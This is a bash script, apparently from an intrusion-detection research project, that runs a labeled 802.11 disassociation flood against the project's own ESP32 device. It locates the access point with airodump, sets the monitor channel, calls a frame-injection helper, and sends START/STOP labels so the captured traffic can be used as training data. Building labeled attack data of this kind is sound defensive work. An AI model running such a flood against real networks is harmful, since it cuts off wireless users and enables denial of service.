#!/usr/bin/env bash
# Disassoc flood + labeling (Kali / monitor mode).
# Usage: sudo -E ./host/attacks/attack_disassoc.sh
#
# 802.11 subtype 10 only (not aireplay -0 deauth, not mdk4 d which mixes both).
# Firmware counts DISASSOC into win_deauth; evidence-gate may already light.
# Label: DISASSOC_FLOOD. Duration default 60 s.
#
# After: sudo -E ./host/attacks/prepare_wifi.sh managed
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

LABEL_SENT=0
_cleanup_label() {
  if [[ "${LABEL_SENT}" -eq 1 ]]; then
    echo ">>> cleanup: sending STOP DISASSOC_FLOOD" >&2
    send_label STOP DISASSOC_FLOOD || true
    LABEL_SENT=0
  fi
}
trap _cleanup_label EXIT

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  _alt="$(iw dev 2>/dev/null | awk '/^[[:space:]]*Interface /{iface=$2} /^[[:space:]]*type monitor/{print iface; exit}')"
  if [[ -n "${_alt:-}" ]]; then
    echo ">>> Using monitor iface ${_alt} (not ${MON_IFACE})"
    MON_IFACE="$_alt"
    export NIDS_MON_IFACE="$_alt"
  else
    echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
    bash "${DIR}/prepare_wifi.sh" monitor
    MON_IFACE="${NIDS_MON_IFACE:-$MON_IFACE}"
  fi
fi
if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ERROR: no monitor iface. Run: iw dev; export NIDS_MON_IFACE=..." >&2
  exit 1
fi

ensure_label_path || exit 1

TARGET_MAC="$(get_esp32_mac)"
DURATION="${NIDS_DISASSOC_SEC:-60}"
PPS="${NIDS_DISASSOC_PPS:-20}"

apply_channel() {
  local ch="$1"
  [[ -n "$ch" && "$ch" != "null" && "$ch" != "0" ]] || return 0
  echo ">>> Setting ${MON_IFACE} to channel ${ch}"
  iw dev "$MON_IFACE" set channel "$ch" 2>/dev/null \
    || iwconfig "$MON_IFACE" channel "$ch" 2>/dev/null \
    || echo ">>> WARN: could not set channel ${ch}" >&2
}

BSSID=""
CHANNEL=""
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
  CHANNEL="${NIDS_WIFI_CHANNEL:-$(_json_field channel 2>/dev/null || true)}"
  echo ">>> Using forced NIDS_BSSID=${BSSID}"
elif [[ "${NIDS_SKIP_AP_SCAN:-0}" != "1" ]]; then
  if hit="$(airodump_find_ap "$MON_IFACE" "$SSID")"; then
    BSSID="${hit%% *}"
    CHANNEL="${hit##* }"
    export NIDS_BSSID="$BSSID"
    export NIDS_WIFI_CHANNEL="$CHANNEL"
    echo ">>> Auto-exported NIDS_BSSID=${BSSID} NIDS_WIFI_CHANNEL=${CHANNEL}"
  else
    echo ">>> WARN: airodump miss — falling back to live_state / iw scan" >&2
  fi
fi

if [[ -z "$BSSID" ]]; then
  BSSID="$(resolve_bssid)" || {
    echo ">>> Could not resolve BSSID. Run airodump or export NIDS_BSSID=.." >&2
    exit 1
  }
fi

if [[ -z "${CHANNEL}" || "${CHANNEL}" == "null" || "${CHANNEL}" == "0" ]]; then
  if [[ -n "${NIDS_WIFI_CHANNEL:-}" ]]; then
    CHANNEL="$NIDS_WIFI_CHANNEL"
  else
    CHANNEL="$(_json_field channel 2>/dev/null || true)"
  fi
fi

apply_channel "$CHANNEL"

echo ">>> Target ESP32 MAC : $TARGET_MAC"
echo ">>> AP BSSID         : $BSSID"
echo ">>> Channel          : ${CHANNEL:-?(unknown)}"
echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> Duration         : ${DURATION}s  pps=${PPS}"
echo ">>> Label host       : $(get_label_host):${LABEL_PORT}"
echo ">>> READY FOR DISASSOC_FLOOD"

send_label START DISASSOC_FLOOD
LABEL_SENT=1
sleep 0.5

set +e
python3 "${DIR}/inject_disassoc.py" "$MON_IFACE" "$BSSID" "$TARGET_MAC" "$DURATION" "$PPS"
inj_rc=$?
set -e
if [[ "$inj_rc" -ne 0 ]]; then
  echo ">>> ERROR: inject_disassoc.py rc=${inj_rc} — do not keep this labeled slice." >&2
  exit 1
fi

sleep 1
send_label STOP DISASSOC_FLOOD
LABEL_SENT=0
echo " >>> DISASSOC_FLOOD FINISHED"
echo " >>> Next: sudo -E ./host/attacks/prepare_wifi.sh managed"
